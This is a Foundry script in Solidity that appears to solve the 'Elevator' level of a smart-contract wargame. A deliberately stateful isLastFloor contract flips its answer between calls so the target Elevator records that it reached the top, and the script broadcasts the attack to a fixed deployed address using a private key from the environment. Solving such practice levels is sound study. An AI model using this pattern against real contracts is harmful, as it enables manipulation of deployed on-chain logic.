// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/11-Elevator.sol";



contract Exploit {
    uint public lastFloor;

    function isLastFloor(uint thisFloor) external returns (bool) {

        if (lastFloor != thisFloor) {
            lastFloor = thisFloor;
            return false;
        } 
        return true;
    }

    function run(Elevator ElevatorInstance) public {
        ElevatorInstance.goTo(666);
    }
}




contract Exp is Script {

    Elevator public ElevatorInstance = Elevator(payable(0xc3060EaD5C14b73c817D12706592e6F2844150a7));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    Exploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);


        console.log("Before exploit - Current floor:", ElevatorInstance.floor());

        exploit = new Exploit();    
        exploit.run(ElevatorInstance);

        console.log("After exploit - Current floor:", ElevatorInstance.floor());
        console.log("isLastFloor:", ElevatorInstance.top());

        vm.stopBroadcast();
    }
}